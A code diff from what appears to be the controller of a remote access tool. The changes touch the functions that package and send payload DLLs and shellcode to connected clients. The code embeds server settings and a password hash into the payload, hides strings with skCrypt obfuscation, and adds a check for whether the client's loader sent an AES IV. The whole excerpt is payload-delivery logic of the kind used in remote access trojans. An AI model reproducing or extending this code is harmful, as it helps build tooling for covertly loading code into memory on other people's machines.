@@ -846,7 +846,6 @@ Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="")
     memcpy(szBuffer + 2 + sizeof(int), srcData, dwFileSize);
     memset(szBuffer + 2 + sizeof(int) + dwFileSize, 0, padding);
     // CMD_DLLDATA + SHELLCODE + dwFileSize + pData
-    auto md5 = CalcMD5FromBytes(szBuffer + 2 + sizeof(int), dwFileSize);
     std::string s(skCrypt(FLAG_FINDEN)), ip, port;
     int offset = MemoryFind((char*)szBuffer, s.c_str(), dwFileSize, s.length());
     if (offset != -1) {
@@ -864,6 +863,7 @@ Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="")
         server->SetType(isDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE);
         memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
     }
+    auto md5 = CalcMD5FromBytes(szBuffer + 2 + sizeof(int), dwFileSize);
     auto ret = new Buffer(szBuffer, bufSize + padding, padding, md5);
     delete[] szBuffer;
     if (srcData != pData)
@@ -2366,6 +2366,13 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
     }
 }
 
+bool isAllZeros(const BYTE* data, int len) {
+    for (int i = 0; i < len; ++i)
+        if (data[i])
+            return false;
+    return true;
+}
+
 VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit)
 {
     auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
@@ -2373,11 +2380,12 @@ VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
     if (buf->length()) {
         // 只有发送了IV的加载器才支持AES加密
         int len = ContextObject->InDeCompressedBuffer.GetBufferLength();
+        bool hasIV = len >= 32 && !isAllZeros(ContextObject->InDeCompressedBuffer.GetBuffer(16), 16);
         char md5[33] = {};
         memcpy(md5, (char*)ContextObject->InDeCompressedBuffer.GetBuffer(32), max(0,min(32, len-32)));
-        if (!buf->MD5().empty() && md5 != buf->MD5())
-            ContextObject->Send2Client( buf->Buf(), buf->length(len<=20));
-        else {
+        if (!buf->MD5().empty() && md5 != buf->MD5()) {
+            ContextObject->Send2Client(buf->Buf(), buf->length(!hasIV));
+        } else {
             ContextObject->Send2Client( buf->Buf(), 6 /* data not changed */);
         }
     }
